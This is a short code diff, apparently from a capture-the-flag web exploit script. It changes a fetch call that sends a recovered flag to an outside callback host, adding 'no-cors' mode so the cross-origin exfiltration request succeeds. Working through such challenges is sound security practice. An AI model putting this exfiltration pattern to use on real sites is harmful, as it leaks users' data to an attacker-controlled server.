@@ -28,7 +28,7 @@
 
                 if(b) break;
             }
-            fetch(`https://${callback}/?flag=${flag}`, {method:'get'});
+            fetch(`https://${callback}/?flag=${flag}`, {method:'get', mode:'no-cors'});
         }
 
         getFlag(abc);
